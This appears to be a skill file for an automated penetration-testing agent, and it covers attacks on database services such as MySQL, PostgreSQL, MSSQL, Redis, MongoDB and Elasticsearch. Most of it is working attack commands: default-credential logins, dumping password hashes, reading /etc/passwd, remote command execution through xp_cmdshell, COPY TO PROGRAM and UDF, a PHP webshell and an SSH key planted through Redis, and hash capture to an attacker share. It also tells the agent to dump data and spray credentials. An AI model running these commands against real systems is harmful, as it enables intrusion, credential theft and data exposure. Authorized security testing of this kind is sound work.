---
name: svc-database
tags: [vuln_assess, exploitation]
description: Database service attack techniques — auth bypass, UDF/xp_cmdshell/COPY-TO-PROGRAM RCE, file read/write, cred dump. Use when a database service is found or you have DB creds. Triggers - MySQL 3306, PostgreSQL 5432, MSSQL 1433, Oracle 1521, Redis 6379, MongoDB 27017, db banner, default DB creds, NOAUTH.
---

# Database Attack Reference

## MySQL (3306)
```bash
# Default/empty password
mysql -h <target> -u root
mysql -h <target> -u root -p root

# Nmap scripts
nmap --script mysql-info,mysql-enum,mysql-empty-password -p 3306 <target>

# If authenticated
mysql> SELECT @@version;
mysql> SHOW DATABASES;
mysql> SELECT user,authentication_string FROM mysql.user;

# File read (requires FILE privilege)
mysql> SELECT LOAD_FILE('/etc/passwd');

# UDF command execution (requires write to plugin dir)
# Upload lib_mysqludf_sys.so → SELECT sys_exec('id');
```

## PostgreSQL (5432)
```bash
# Default credentials
psql -h <target> -U postgres
psql -h <target> -U postgres -W   # try: postgres, password, admin

# Nmap scripts
nmap --script pgsql-brute -p 5432 <target>

# If authenticated
postgres=# SELECT version();
postgres=# \l                        -- list databases
postgres=# SELECT usename, passwd FROM pg_shadow;

# Command execution (superuser)
postgres=# COPY (SELECT '') TO PROGRAM 'id';
# Or via large objects
```

## MSSQL (1433)
```bash
# Default SA account
impacket-mssqlclient <target> -windows-auth
impacket-mssqlclient sa:''@<target>

# Nmap scripts
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-brute -p 1433 <target>

# If authenticated — command execution
SQL> EXEC xp_cmdshell 'whoami';
# Enable if disabled
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# File read
SQL> EXEC xp_dirtree '\\<attacker>\share';   # capture hash via responder
```

## Redis (6379)
```bash
# No-auth access
redis-cli -h <target> INFO
redis-cli -h <target> CONFIG GET *
redis-cli -h <target> KEYS *

# SSH key write for RCE
redis-cli -h <target> CONFIG SET dir /root/.ssh
redis-cli -h <target> CONFIG SET dbfilename authorized_keys
redis-cli -h <target> SET payload "\n\nssh-rsa AAAA...your_key...\n\n"
redis-cli -h <target> SAVE

# Webshell via Redis
redis-cli -h <target> CONFIG SET dir /var/www/html
redis-cli -h <target> CONFIG SET dbfilename shell.php
redis-cli -h <target> SET payload '<?php system($_GET["cmd"]); ?>'
redis-cli -h <target> SAVE
```

## MongoDB (27017)
```bash
# No-auth access
mongosh --host <target> --eval "db.adminCommand('listDatabases')"
mongosh --host <target> <db_name> --eval "db.getCollectionNames()"
```

## Elasticsearch (9200)
```bash
curl http://<target>:9200/
curl http://<target>:9200/_cat/indices?v
curl http://<target>:9200/_search?pretty
```

## Decide — which DB path first
| Signal | Action |
|---|---|
| No auth (Redis/Mongo/ES) | Dump data immediately — fastest proven impact |
| Default creds work | Check reuse via `cred_spray` before moving on |
| Authenticated MySQL w/ FILE priv | LOAD_FILE secrets → web config → app creds |
| MSSQL + sysadmin | xp_cmdshell = shell; else hash capture via xp_dirtree |
| PostgreSQL superuser | COPY TO PROGRAM RCE |
| Redis on web host | webshell write beats SSH-key write (no key perms needed) |

## Exploit → PROVE IMPACT
- Data access: one real record dump from a sensitive table (users/payments) — `SELECT` listing ≠ impact.
- RCE: `id`/`whoami` output through UDF/COPY TO/xp_cmdshell recorded verbatim.
- Redis write-to-RCE: executed payload output visible (`webshell` returns cmd result or SSH login succeeds).
- Record DB type+version+creds in state via `state_update`; feed creds to `cred_spray` reuse check.

## Tooling
`nmap_parse` for service/version confirmation, `state_update` every finding, `report_gen` consumes confirmed vulns. Pair with `svc-web-server` (config files often leak DB creds).

## False positives / pitfalls
- **Redis CONFIG SET fails silently on newer versions** — `enabled-protection`/rename-command blocks it; verify dir actually changed.
- **UDF needs plugin dir writable AND matching arch** — 64-bit .so on 32-bit server dies silently; check @@plugin_dir first.
- **xp_cmdshell enabled ≠ working** — service account may lack network/logon rights; test `whoami` not just EXEC success.
- **Mongo without auth but with localhost binding** — remote access blocked; confirm connection actually succeeded remotely.
- **Never DROP/UPDATE production data** — read-only proof discipline; destructive SQL violates engagement rules.
- **Cred reuse** — cracked/default DB password likely reuses elsewhere; always run `cred_spray` after first hit.
